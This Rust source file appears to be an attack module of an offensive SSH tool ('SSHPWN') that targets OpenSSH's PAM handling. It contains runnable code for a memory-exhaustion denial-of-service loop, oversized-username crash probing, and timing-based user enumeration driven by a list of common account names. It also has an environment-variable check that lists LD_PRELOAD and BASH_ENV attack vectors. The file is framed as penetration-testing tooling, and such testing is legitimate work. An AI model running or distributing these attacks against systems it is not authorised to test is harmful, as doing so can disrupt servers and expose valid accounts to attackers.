//! SSHPWN PAM Attack Module
//!
//! Based on OpenSSH 10.0p1 auth-pam.c vulnerability analysis
//!
//! PAM VULNERABILITIES (auth-pam.c):
//! - sshpam_password static storage - Password recovery via memory forensics (LOW)
//! - pam_putenv() memory leak - DoS via memory exhaustion (LOW)
//! - import_environments() - Environment variable injection (MEDIUM)
//! - Missing username length validation on non-Solaris (LOW-MEDIUM)
//! - setreuid() race condition - Privilege state issues (LOW)
//! - Timing attack mitigation gap - Incomplete coverage (LOW)
//!
//! For authorized penetration testing only.

use anyhow::{anyhow, Context, Result};
use colored::*;
use crate::utils::normalize_target;
use ssh2::Session;
use std::{
    io::{Read, Write},
    net::TcpStream,
    path::Path,
    time::{Duration, Instant},
};


const DEFAULT_TIMEOUT_SECS: u64 = 30;

fn display_banner() {
    println!("{}", "╔═══════════════════════════════════════════════════════════════════╗".cyan());
    println!("{}", "║   SSHPWN - PAM Attack Module                                      ║".cyan());
    println!("{}", "║   Based on OpenSSH auth-pam.c vulnerability analysis              ║".cyan());
    println!("{}", "║                                                                   ║".cyan());
    println!("{}", "║   Attack Modes:                                                   ║".cyan());
    println!("{}", "║   1. PAM Memory Exhaustion DoS (pam_putenv leak)                  ║".cyan());
    println!("{}", "║   2. Username Length Overflow Test                                ║".cyan());
    println!("{}", "║   3. PAM Timing Attack (user enumeration)                         ║".cyan());
    println!("{}", "║   4. Environment Variable Injection Test                          ║".cyan());
    println!("{}", "╚═══════════════════════════════════════════════════════════════════╝".cyan());
    println!();
}

// Use framework's normalize_target utility - removed custom implementation

/// Create SSH session with authentication
fn create_ssh_session(
    host: &str,
    port: u16,
    username: &str,
    password: Option<&str>,
    keyfile: Option<&str>,
    timeout_secs: u64,
) -> Result<(TcpStream, Session)> {
    let addr = format!("{}:{}", host, port);
    let tcp = TcpStream::connect_timeout(
        &addr.parse().context("Invalid address")?,
                                         Duration::from_secs(timeout_secs),
    ).context("Connection failed")?;

    tcp.set_read_timeout(Some(Duration::from_secs(timeout_secs)))?;
    tcp.set_write_timeout(Some(Duration::from_secs(timeout_secs)))?;

    let mut sess = Session::new()?;
    sess.set_tcp_stream(tcp.try_clone()?);
    sess.handshake()?;

    // Authenticate
    if let Some(key) = keyfile {
        sess.userauth_pubkey_file(username, None, Path::new(key), password)?;
    } else if let Some(pass) = password {
        sess.userauth_password(username, pass)?;
    } else {
        return Err(anyhow!("No authentication method provided"));
    }

    if !sess.authenticated() {
        return Err(anyhow!("Authentication failed"));
    }

    Ok((tcp, sess))
}

/// Time a single authentication attempt (for timing attacks)
fn time_auth_attempt(host: &str, port: u16, username: &str, password: &str, timeout_secs: u64) -> Option<f64> {
    let addr = format!("{}:{}", host, port);

    let start = Instant::now();

    let tcp = match TcpStream::connect_timeout(
        &addr.parse().ok()?,
                                               Duration::from_secs(timeout_secs),
    ) {
        Ok(s) => s,
        Err(_) => return None,
    };

    let _ = tcp.set_read_timeout(Some(Duration::from_secs(timeout_secs)));
    let _ = tcp.set_write_timeout(Some(Duration::from_secs(timeout_secs)));

    let mut sess = match Session::new() {
        Ok(s) => s,
        Err(_) => return None,
    };

    sess.set_tcp_stream(tcp);
    if sess.handshake().is_err() {
        return None;
    }

    // Try authentication
    let _ = sess.userauth_password(username, password);

    let elapsed = start.elapsed().as_secs_f64();
    Some(elapsed)
}

/// PAM Memory Exhaustion DoS Test
///
/// Vulnerability: auth-pam.c lines 378-382 - pam_putenv() memory leak
/// Each authentication attempt leaks memory. Repeated attempts can exhaust server memory.
pub async fn attack_pam_memory_dos(
    host: &str,
    port: u16,
    iterations: u32,
    delay_ms: u64,
) -> Result<bool> {
    println!("{}", format!("[*] PAM Memory Exhaustion DoS on {}", host).cyan());
    println!("{}", "[*] Vulnerability: auth-pam.c pam_putenv() memory leak".cyan());
    println!();

    println!("{}", "[!] WARNING: This test performs many authentication attempts".yellow().bold());
    println!("{}", "[!] It may trigger account lockouts or rate limiting".yellow());
    println!();

    println!("{}", format!("[*] Testing with {} iterations, {}ms delay", iterations, delay_ms).cyan());

    let mut successful = 0u32;
    let mut failed = 0u32;

    for i in 0..iterations {
        if i % 10 == 0 {
            print!("\r[*] Progress: {}/{} (success: {}, fail: {})    ", i, iterations, successful, failed);
            let _ = std::io::stdout().flush();
        }

        // Try authentication with invalid credentials
        // Each attempt that reaches PAM processing leaks memory
        let invalid_pass = format!("invalid_{}_{}", std::process::id(), i);

        match time_auth_attempt(host, port, "nobody", &invalid_pass, 10) {
            Some(_) => successful += 1,
            None => failed += 1,
        }

        if delay_ms > 0 {
            std::thread::sleep(Duration::from_millis(delay_ms));
        }
    }

    println!();
    println!();
    println!("{}", "=== PAM Memory DoS Results ===".cyan().bold());
    println!("Total attempts: {}", iterations);
    println!("Successful connections: {}", successful);
    println!("Failed connections: {}", failed);
    println!();

    if successful > 0 {
        println!("{}", "[VULN] Server accepted connections - memory leak may be exploitable".red().bold());
        println!("{}", "[*] Monitor server memory usage during extended attacks".cyan());
        println!("{}", "[*] Each PAM environment variable leaked per auth attempt".cyan());
        Ok(true)
    } else {
        println!("{}", "[-] Could not establish connections - rate limiting may be active".yellow());
        Ok(false)
    }
}

/// Username Length Overflow Test
///
/// Vulnerability: auth-pam.c lines 696-699 - Username length only validated on Solaris
/// Non-Solaris systems may be vulnerable to buffer overflows in PAM modules
pub async fn attack_pam_username_overflow(
    host: &str,
    port: u16,
    max_length: usize,
) -> Result<bool> {
    println!("{}", format!("[*] PAM Username Length Overflow Test on {}", host).cyan());
    println!("{}", "[*] Vulnerability: auth-pam.c missing username length validation".cyan());
    println!("{}", "[*] Only Solaris validates PAM_MAX_RESP_SIZE (1024 bytes)".cyan());
    println!();

    // Test progressively longer usernames
    let test_lengths = vec![
        64, 128, 256, 512, 1024, 2048, 4096, 8192,
        max_length.min(16384),
    ];

    println!("{}", "[*] Testing username lengths:".cyan());

    let mut vulnerable_length = None;

    for &len in &test_lengths {
        if len > max_length {
            break;
        }

        // Generate username of specified length
        let username: String = std::iter::repeat('A').take(len).collect();

        print!("  Testing {} bytes... ", len);
        let _ = std::io::stdout().flush();

        let start = Instant::now();
        let result = time_auth_attempt(host, port, &username, "test", 15);
        let elapsed = start.elapsed();

        match result {
            Some(t) => {
                if elapsed.as_secs() > 10 {
                    println!("{}", format!("SLOW ({:.2}s) - potential DoS", t).yellow());
                    vulnerable_length = Some(len);
                } else {
                    println!("{}", format!("OK ({:.2}s)", t).green());
                }
            }
            None => {
                if elapsed.as_secs() > 10 {
                    println!("{}", "TIMEOUT - server may have crashed/hung".red().bold());
                    vulnerable_length = Some(len);
                    break;
                } else {
                    println!("{}", "Connection failed".yellow());
                }
            }
        }

        // Small delay between tests
        std::thread::sleep(Duration::from_millis(500));
    }

    println!();
    println!("{}", "=== Username Overflow Results ===".cyan().bold());

    if let Some(len) = vulnerable_length {
        println!("{}", format!("[VULN] Potential vulnerability at {} bytes", len).red().bold());
        println!("{}", "[*] Server showed abnormal behavior with long username".cyan());
        println!("{}", "[*] PAM modules may have fixed-size username buffers".cyan());
        Ok(true)
    } else {
        println!("{}", "[*] No obvious overflow detected".green());
        println!("{}", "[*] Server may have proper input validation".cyan());
        Ok(false)
    }
}

/// PAM Timing Attack - Enhanced user enumeration
///
/// Vulnerability: auth-pam.c lines 1361-1368 - Timing attack mitigation gap
/// fake_password() only used for invalid users/root denied, not for empty passwords
pub async fn attack_pam_timing(
    host: &str,
    port: u16,
    usernames: &[String],
    samples: usize,
) -> Result<Vec<String>> {
    println!("{}", format!("[*] PAM Timing Attack on {}", host).cyan());
    println!("{}", "[*] Vulnerability: auth-pam.c incomplete timing mitigation".cyan());
    println!("{}", "[*] Testing: valid vs invalid user timing differences".cyan());
    println!();

    // Establish baseline with definitely invalid user
    let baseline_user = format!("nonexistent_user_{}_{}", std::process::id(), Instant::now().elapsed().as_nanos());

    println!("{}", "[*] Establishing baseline timing...".cyan());

    let mut baseline_times = Vec::new();
    for _ in 0..samples {
        if let Some(t) = time_auth_attempt(host, port, &baseline_user, "invalid", 15) {
            baseline_times.push(t);
        }
        std::thread::sleep(Duration::from_millis(100));
    }

    if baseline_times.is_empty() {
        println!("{}", "[-] Could not establish baseline - cannot reach target".red());
        return Ok(Vec::new());
    }

    let baseline = baseline_times.iter().sum::<f64>() / baseline_times.len() as f64;
    println!("{}", format!("[*] Baseline timing: {:.3}s", baseline).cyan());

    // Test empty password timing (potential gap in fake_password coverage)
    println!();
    println!("{}", "[*] Testing empty password timing gap...".cyan());

    let mut empty_times = Vec::new();
    for _ in 0..samples {
        if let Some(t) = time_auth_attempt(host, port, &baseline_user, "", 15) {
            empty_times.push(t);
        }
        std::thread::sleep(Duration::from_millis(100));
    }

    if !empty_times.is_empty() {
        let empty_avg = empty_times.iter().sum::<f64>() / empty_times.len() as f64;
        let diff = empty_avg - baseline;
        if diff.abs() > 0.1 {
            println!("{}", format!("[VULN] Empty password timing differs: {:+.3}s", diff).red().bold());
            println!("{}", "[*] This may indicate incomplete timing attack mitigation".yellow());
        } else {
            println!("{}", format!("[*] Empty password timing: {:.3}s (diff: {:+.3}s)", empty_avg, diff).dimmed());
        }
    }

    // Test provided usernames
    println!();
    println!("{}", "[*] Testing usernames for timing differences...".cyan());

    let mut valid_users = Vec::new();

    for user in usernames {
        print!("\r[*] Testing: {}          ", user);
        let _ = std::io::stdout().flush();

        let mut times = Vec::new();
        for _ in 0..samples {
            if let Some(t) = time_auth_attempt(host, port, user, "invalid_password", 15) {
                times.push(t);
            }
            std::thread::sleep(Duration::from_millis(100));
        }

        if !times.is_empty() {
            let avg = times.iter().sum::<f64>() / times.len() as f64;
            let diff = avg - baseline;

            // Significant timing difference indicates valid user
            if diff.abs() > 0.3 {
                println!("\r{}", format!("[+] Valid user: {} (timing diff: {:+.3}s)", user, diff).green());
                valid_users.push(user.clone());
            }
        }
    }

    println!();
    println!("{}", "=== PAM Timing Results ===".cyan().bold());

    if valid_users.is_empty() {
        println!("{}", "[-] No valid users found via timing attack".yellow());
    } else {
        println!("{}", format!("[+] Found {} valid user(s):", valid_users.len()).green());
        for user in &valid_users {
            println!("    - {}", user.green());
        }
    }

    Ok(valid_users)
}

/// PAM Environment Variable Injection Test
///
/// Vulnerability: auth-pam.c lines 350-383 - import_environments()
/// Up to 1024 env vars imported from PAM subprocess without sanitization
pub async fn attack_pam_env_injection(
    host: &str,
    port: u16,
    username: &str,
    password: Option<&str>,
    keyfile: Option<&str>,
) -> Result<bool> {
    println!("{}", format!("[*] PAM Environment Injection Test on {}", host).cyan());
    println!("{}", "[*] Vulnerability: auth-pam.c import_environments()".cyan());
    println!("{}", "[*] Tests what environment variables are accepted/set".cyan());
    println!();

    let (_, sess) = create_ssh_session(host, port, username, password, keyfile, DEFAULT_TIMEOUT_SECS)?;

    // Check current environment
    let dangerous_vars = vec![
        "LD_PRELOAD",
        "LD_LIBRARY_PATH",
        "LD_AUDIT",
        "LD_DEBUG",
        "LD_PROFILE",
        "PATH",
        "BASH_ENV",
        "ENV",
        "CDPATH",
        "GLOBIGNORE",
        "BASH_FUNC_",
        "SSH_AUTH_INFO_0",
        "KRB5CCNAME",
        "SSH_CONNECTION",
    ];

    println!("{}", "[*] Checking dangerous environment variables:".cyan());

    let mut channel = sess.channel_session()?;
    channel.exec("env")?;

    let mut env_output = String::new();
    channel.read_to_string(&mut env_output)?;
    channel.wait_close()?;

    let mut found_dangerous = Vec::new();

    for var in &dangerous_vars {
        for line in env_output.lines() {
            if line.starts_with(var) {
                println!("{}", format!("  [!] {}", line).yellow());
                found_dangerous.push(line.to_string());
            }
        }
    }

    println!();
    println!("{}", "[*] Testing PAM-specific variables:".cyan());

    // Check for PAM-related environment
    let pam_vars = vec!["PAM_", "SSH_AUTH", "KRB5", "GSSAPI"];

    for var in &pam_vars {
        for line in env_output.lines() {
            if line.contains(var) {
                println!("{}", format!("  [PAM] {}", line).cyan());
            }
        }
    }

    println!();
    println!("{}", "=== PAM Environment Results ===".cyan().bold());

    // Explicit session cleanup
    drop(sess);

    if !found_dangerous.is_empty() {
        println!("{}", format!("[!] Found {} potentially dangerous variables", found_dangerous.len()).yellow());
        println!("{}", "[*] These could be exploited by malicious PAM modules".cyan());
        println!();
        println!("{}", "[*] Attack vectors:".cyan());
        println!("{}", "  - LD_PRELOAD: Load malicious shared library".dimmed());
        println!("{}", "  - PATH: Execute trojan commands".dimmed());
        println!("{}", "  - BASH_ENV: Execute code on bash startup".dimmed());
        println!("{}", "  - KRB5CCNAME: Credential cache manipulation".dimmed());
    } else {
        println!("{}", "[*] No obviously dangerous variables found in environment".green());
    }

    println!();
    println!("{}", "[*] Note: Environment injection requires compromised PAM module".yellow());
    println!("{}", "[*] Check /etc/pam.d/sshd for module configuration".dimmed());

    Ok(!found_dangerous.is_empty())
}

/// Prompt helper
fn prompt(message: &str) -> Result<String> {
    print!("{}: ", message);
    std::io::stdout()
        .flush()
        .context("Failed to flush stdout")?;
    let mut input = String::new();
    std::io::stdin()
        .read_line(&mut input)
        .context("Failed to read input")?;
    Ok(input.trim().to_string())
}

fn prompt_default(message: &str, default: &str) -> Result<String> {
    print!("{} [{}]: ", message, default);
    std::io::stdout()
        .flush()
        .context("Failed to flush stdout")?;
    let mut input = String::new();
    std::io::stdin()
        .read_line(&mut input)
        .context("Failed to read input")?;
    let trimmed = input.trim();
    if trimmed.is_empty() {
        Ok(default.to_string())
    } else {
        Ok(trimmed.to_string())
    }
}

fn prompt_optional(message: &str) -> Result<Option<String>> {
    print!("{} (leave empty to skip): ", message);
    std::io::stdout()
        .flush()
        .context("Failed to flush stdout")?;
    let mut input = String::new();
    std::io::stdin()
        .read_line(&mut input)
        .context("Failed to read input")?;
    let trimmed = input.trim();
    if trimmed.is_empty() {
        Ok(None)
    } else {
        Ok(Some(trimmed.to_string()))
    }
}

fn prompt_yes_no(message: &str, default: bool) -> Result<bool> {
    let hint = if default { "Y/n" } else { "y/N" };
    print!("{} [{}]: ", message, hint);
    std::io::stdout()
        .flush()
        .context("Failed to flush stdout")?;
    let mut input = String::new();
    std::io::stdin()
        .read_line(&mut input)
        .context("Failed to read input")?;
    let trimmed = input.trim().to_lowercase();
    match trimmed.as_str() {
        "" => Ok(default),
        "y" | "yes" => Ok(true),
        "n" | "no" => Ok(false),
        _ => Ok(default),
    }
}

/// Default usernames for timing attack
const DEFAULT_USERNAMES: &[&str] = &[
    "root", "admin", "user", "test", "guest",
"ubuntu", "www-data", "daemon", "bin", "sys",
"nobody", "mysql", "postgres", "oracle", "ftp",
"ssh", "apache", "nginx", "tomcat", "redis",
];

/// Main entry point
pub async fn run(target: &str) -> Result<()> {
    display_banner();

    let host = normalize_target(target)?;
    println!("{}", format!("[*] Target: {}", host).cyan());

    // Get port
    let port: u16 = prompt_default("SSH Port", "22")?.parse().unwrap_or(22);

    println!();
    println!("{}", "Select attack mode:".yellow().bold());
    println!("  1. PAM Memory Exhaustion DoS (no auth required)");
    println!("  2. Username Length Overflow Test (no auth required)");
    println!("  3. PAM Timing Attack - User Enumeration (no auth required)");
    println!("  4. Environment Variable Injection (requires auth)");
    println!("  5. Run All Attacks");
    println!();

    let mode = prompt_default("Attack mode", "3")?;

    match mode.as_str() {
        "1" => {
            let iterations: u32 = prompt_default("Number of attempts", "100")?.parse().unwrap_or(100);
            let delay: u64 = prompt_default("Delay between attempts (ms)", "100")?.parse().unwrap_or(100);
            attack_pam_memory_dos(&host, port, iterations, delay).await?;
        }
        "2" => {
            let max_len: usize = prompt_default("Maximum username length", "8192")?.parse().unwrap_or(8192);
            attack_pam_username_overflow(&host, port, max_len).await?;
        }
        "3" => {
            let samples: usize = prompt_default("Samples per username", "3")?.parse().unwrap_or(3);

            // Get usernames
            let mut usernames: Vec<String> = Vec::new();

            if prompt_yes_no("Use default username list?", true)? {
                for user in DEFAULT_USERNAMES {
                    usernames.push(user.to_string());
                }
            }

            let custom = prompt_optional("Additional usernames (comma-separated)")?;
            if let Some(custom_users) = custom {
                for user in custom_users.split(',') {
                    let user = user.trim();
                    if !user.is_empty() && !usernames.contains(&user.to_string()) {
                        usernames.push(user.to_string());
                    }
                }
            }

            attack_pam_timing(&host, port, &usernames, samples).await?;
        }
        "4" => {
            let username = prompt("Username")?;
            if username.is_empty() {
                return Err(anyhow!("Username is required"));
            }

            let password = prompt_optional("Password")?;
            let keyfile = prompt_optional("SSH Key File Path")?;

            if password.is_none() && keyfile.is_none() {
                return Err(anyhow!("Either password or keyfile is required"));
            }

            attack_pam_env_injection(&host, port, &username, password.as_deref(), keyfile.as_deref()).await?;
        }
        "5" | _ => {
            println!();
            println!("{}", "=== Running All PAM Attacks ===".yellow().bold());

            println!();
            println!("{}", "--- Attack 1: Memory Exhaustion ---".cyan());
            if prompt_yes_no("Run memory DoS test (50 iterations)?", false)? {
                let _ = attack_pam_memory_dos(&host, port, 50, 100).await;
            } else {
                println!("{}", "[*] Skipped".dimmed());
            }

            println!();
            println!("{}", "--- Attack 2: Username Overflow ---".cyan());
            let _ = attack_pam_username_overflow(&host, port, 4096).await;

            println!();
            println!("{}", "--- Attack 3: Timing Attack ---".cyan());
            let usernames: Vec<String> = DEFAULT_USERNAMES.iter().map(|s| s.to_string()).collect();
            let _ = attack_pam_timing(&host, port, &usernames, 2).await;

            println!();
            println!("{}", "--- Attack 4: Environment Injection ---".cyan());
            println!("{}", "[*] Requires authentication - skipping in automated mode".dimmed());
        }
    }

    println!();
    println!("{}", "[*] PAM attack module complete".green());

    Ok(())
}
